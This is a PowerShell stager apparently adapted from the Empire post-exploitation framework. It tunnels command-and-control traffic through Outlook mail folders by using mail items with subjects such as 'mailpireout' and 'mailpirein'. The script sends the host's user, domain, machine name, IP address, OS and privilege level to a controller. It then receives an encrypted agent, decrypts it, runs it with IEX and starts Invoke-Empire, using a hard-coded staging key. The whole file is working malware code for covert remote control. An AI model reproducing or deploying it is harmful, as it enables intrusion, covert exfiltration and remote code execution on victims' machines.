function Start-Negotiate {
    param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')

    function ConvertTo-RC4ByteStream {
        Param ($RCK, $In)
        begin {
            [Byte[]] $S = 0..255;
            $J = 0;
            0..255 | ForEach-Object {
                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;
                $S[$_], $S[$J] = $S[$J], $S[$_];
            };
            $I = $J = 0;
        }
        process {
            ForEach($Byte in $In) {
                $I = ($I + 1) % 256;
                $J = ($J + $S[$I]) % 256;
                $S[$I], $S[$J] = $S[$J], $S[$I];
                $Byte -bxor $S[($S[$I] + $S[$J]) % 256];
            }
        }
    }

    function Decrypt-Bytes {
        param ($Key, $In)
        if($In.Length -gt 32) {
            $HMAC = New-Object System.Security.Cryptography.HMACSHA256;
            $e=[System.Text.Encoding]::ASCII;
            # Verify the HMAC
            $Mac = $In[-10..-1];
            $In = $In[0..($In.length - 11)];
            $hmac.Key = $e.GetBytes($Key);
            $Expected = $hmac.ComputeHash($In)[0..9];
            if (@(Compare-Object $Mac $Expected -Sync 0).Length -ne 0) {
                return;
            }

            # extract the IV
            $IV = $In[0..15];
            $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
            $AES.Mode = "CBC";
            $AES.Key = $e.GetBytes($Key);
            $AES.IV = $IV;
            ($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length-16)
        }
    }

    # make sure the appropriate assemblies are loaded
    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Security");
    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Core");

    # try to ignore all errors
    $ErrorActionPreference = "SilentlyContinue";
    $e=[System.Text.Encoding]::ASCII;

    $SKB=$e.GetBytes($SK);
    # set up the AES/HMAC crypto
    # $SK -> staging key for this server
    $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    $IV = [byte] 0..255 | Get-Random -count 16;
    $AES.Mode="CBC";
    $AES.Key=$SKB;
    $AES.IV = $IV;

    $hmac = New-Object System.Security.Cryptography.HMACSHA256;
    $hmac.Key = $SKB;

    $csp = New-Object System.Security.Cryptography.CspParameters;
    $csp.Flags = $csp.Flags -bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore;
    $rs = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 2048,$csp;
    # export the public key in the only format possible...stupid
    $rk=$rs.ToXmlString($False);

    # generate a randomized sessionID of 8 characters
    $ID=-join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 8);

    # build the packet of (xml_key)
    $ib=$e.getbytes($rk);

    # encrypt/HMAC the packet for the c2 server
    $eb=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);
    $eb=$eb+$hmac.ComputeHash($eb)[0..9];

    Add-Type -assembly "Microsoft.Office.Interop.Outlook"
    $outlook = New-Object -comobject Outlook.Application
    $mapi = $Outlook.GetNameSpace("MAPI")

    # RC4 routing packet:
    #   sessionID = $ID
    #   language = POWERSHELL (1)
    #   meta = STAGE1 (2)
    #   extra = (0x00, 0x00)
    #   length = len($eb)
    $IV=[BitConverter]::GetBytes($(Get-Random));
    $data = $e.getbytes($ID) + @(0x01,0x02,0x00,0x00) + [BitConverter]::GetBytes($eb.Length);
    $rc4p = ConvertTo-RC4ByteStream -RCK $($IV+$SKB) -In $data;
    $rc4p = $IV + $rc4p + $eb;

    # step 3 of negotiation -> client posts AESstaging(PublicKey) to the server

    #$raw=$wc.UploadData($s+"/index.jsp","POST",$rc4p);
    $f = $mapi.Folders | select name
    $inf = 0
    $cntr = 1
    foreach ($name in $f) {
      if($name.name -eq $UA){
        $inf = $cntr
      }
      $cntr += 1
    }

    $c = [System.BitConverter]::ToString($rc4p)
    $mail = $outlook.CreateItem(0)
    $mail.Subject = "mailpireout"
    $mail.Body = "POST - "+$c
    $mail.save() | out-null
    $mail.Move($mapi.Folders.Item($inf).Folders.Item('Inbox').Folders.Item('tunnelmeszs'))| out-null

    #keep checking to see if there is response
    $break = $False
    $bytes = ""
    While ($break -ne $True){
      foreach ($item in $mapi.Folders.Item($inf).Folders.Item('Inbox').Folders.Item('tunnelmeszs').Items) {
        if($item.Subject -eq "mailpirein")
        {
          $item.HTMLBody | out-null #this seems to force the message to be fully downloaded (not just headers)
          if($item.Body[$item.Body.Length-1] -ne '-'){ #our message needs to fully load
            $traw = $item.Body
            $item.Delete()
            $break = $True
            $t = $traw.Split('-')
            $bytes = @()
            Foreach ($element in $t) {
              $bytes = $bytes + [byte]([Convert]::toInt16($element,16))
            }
            $raw = $bytes
          }
        }
      }
      Start-Sleep -s 2;
    }

    # step 4 of negotiation -> server returns RSA(nonce+AESsession))
    $de=$e.GetString($rs.decrypt($raw,$false));

    # packet = server nonce + AES session key
    $nonce=$de[0..15] -join '';
    $key=$de[16..$de.length] -join '';

    # increment the nonce
    $nonce=[String]([long]$nonce + 1);

    # create a new AES object
    $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    $IV = [byte] 0..255 | Get-Random -Count 16;
    $AES.Mode="CBC";
    $AES.Key=$e.GetBytes($key);
    $AES.IV = $IV;

    # get some basic system information
    $i=$nonce+'|'+$s+'|'+[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
    $p=(gwmi Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);

    # check if the IP is a string or the [IPv4,IPv6] array
    $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
    if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
    $i+="|$ip";

    $i+='|'+(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];

    # detect if we're SYSTEM or otherwise high-integrity
    if(([Environment]::UserName).ToLower() -eq "system"){$i+="|True"}
    else {$i += '|' +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")}

    # get the current process name and ID
    $n=[System.Diagnostics.Process]::GetCurrentProcess();
    $i+='|'+$n.ProcessName+'|'+$n.Id;
    # get the powershell.exe version
    $i += "|powershell|" + $PSVersionTable.PSVersion.Major;

    # send back the initial system information
    $ib2=$e.getbytes($i);
    $eb2=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);
    $hmac.Key = $e.GetBytes($key);
    $eb2 = $eb2+$hmac.ComputeHash($eb2)[0..9];

    # RC4 routing packet:
    #   sessionID = $ID
    #   language = POWERSHELL (1)
    #   meta = STAGE2 (3)
    #   extra = (0x00, 0x00)
    #   length = len($eb)
    $IV2=[BitConverter]::GetBytes($(Get-Random));
    $data2 = $e.getbytes($ID) + @(0x01,0x03,0x00,0x00) + [BitConverter]::GetBytes($eb2.Length);
    $rc4p2 = ConvertTo-RC4ByteStream -RCK $($IV2+$SKB) -In $data2;
    $rc4p2 = $IV2 + $rc4p2 + $eb2;

    # the User-Agent always resets for multiple calls...silly

    # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
    #$raw=$wc.UploadData($s+"/index.php","POST",$rc4p2);
    $c = [System.BitConverter]::ToString($rc4p2)
    $mail = $outlook.CreateItem(0)
    $mail.Subject = "mailpireout"
    $mail.Body = "POST - "+$c
    $mail.save() | out-null
    $mail.Move($mapi.Folders.Item($inf).Folders.Item('Inbox').Folders.Item('tunnelmeszs'))| out-null

    #keep checking to see if there is response
    $break = $False
    $raw = ""

    write-host "trying next part"
    While ($break -ne $True){
      foreach ($item in $mapi.Folders.Item($inf).Folders.Item('Inbox').Folders.Item('tunnelmeszs').Items) {
        write-host "grr"
        if($item.Subject -eq "mailpirein")
        {

          #$item.HTMLBody | out-null #this seems to force the message to be fully downloaded (not just headers)
          if($item.DownloadState -eq 1 -and $item.Body[$item.Body.Length-1] -ne '-'){ #our message needs to fully load
            $item.Body.length
            write-host "mooo"
            $traw = $item.Body
            $item.Delete()
            $break = $True
            $t = $traw.Split('-')
            $bytes = @()
            Foreach ($element in $t) {
              $bytes = $bytes + [byte]([Convert]::toInt16($element,16))
            }
            $raw = $bytes
          } else {
            $item.MarkForDownload = 1
            $item.HTMLBody | out-null #this seems to force the message to be fully downloaded (not just headers)
          }
        }
      }
      Start-Sleep -s 2;
    }

    # # decrypt the agent and register the agent logic
    # $data = $e.GetString($(Decrypt-Bytes -Key $key -In $raw));
    # write-host "data len: $($Data.Length)";
    #IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $praw)) );
    $pppp =  $e.GetString($(Decrypt-Bytes -Key $key -In $raw))
    IEX $($pppp)

    #IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );
    # clear some variables out of memory and cleanup before execution
    $AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;
    [GC]::Collect();

    # TODO: remove this shitty $server logic
    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID;
}
# $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
Start-Negotiate -s "$ser" -SK '9a8d9845a6b4d82dfcb2c2e35162c831' -UA "jamesthetester@outlook.com"#$u;
